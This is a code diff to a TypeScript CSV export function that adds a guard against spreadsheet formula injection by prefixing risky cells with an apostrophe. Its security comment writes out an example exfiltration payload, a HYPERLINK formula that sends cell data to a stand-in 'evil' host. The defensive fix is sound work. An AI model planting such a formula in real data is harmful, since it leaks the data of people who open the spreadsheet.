@@ -3,15 +3,28 @@
 // Excel-friendly: writes a UTF-8 BOM so accents survive when opened in Excel
 // on Windows.
 
+// SECURITY: cells that start with `=`, `+`, `-`, `@`, `\t` or `\r` are treated
+// as formulas by Excel / Google Sheets / Numbers — a hostile member could set
+// their display name to `=HYPERLINK("https://evil/?leak="&A1,"View")` and have
+// the org admin's spreadsheet exfiltrate data on open. We neutralise by
+// prefixing such cells with a single apostrophe (the canonical OWASP fix —
+// invisible to the user but stops formula evaluation).
+const FORMULA_START_RE = /^[=+\-@\t\r]/;
+
+export function escapeCell(v: unknown): string {
+  if (v == null) return '';
+  let s = String(v);
+  // Formula-injection guard BEFORE quote handling.
+  if (s.length > 0 && FORMULA_START_RE.test(s)) {
+    s = "'" + s;
+  }
+  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
+}
+
 export function toCsv(headers: string[], rows: (string | number | null | undefined)[][]): string {
-  const escape = (v: unknown): string => {
-    if (v == null) return '';
-    const s = String(v);
-    return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
-  };
   const lines = [
-    headers.map(escape).join(','),
-    ...rows.map((row) => row.map(escape).join(',')),
+    headers.map(escapeCell).join(','),
+    ...rows.map((row) => row.map(escapeCell).join(',')),
   ];
   return '﻿' + lines.join('\r\n'); // BOM + CRLF for Excel compatibility
 }
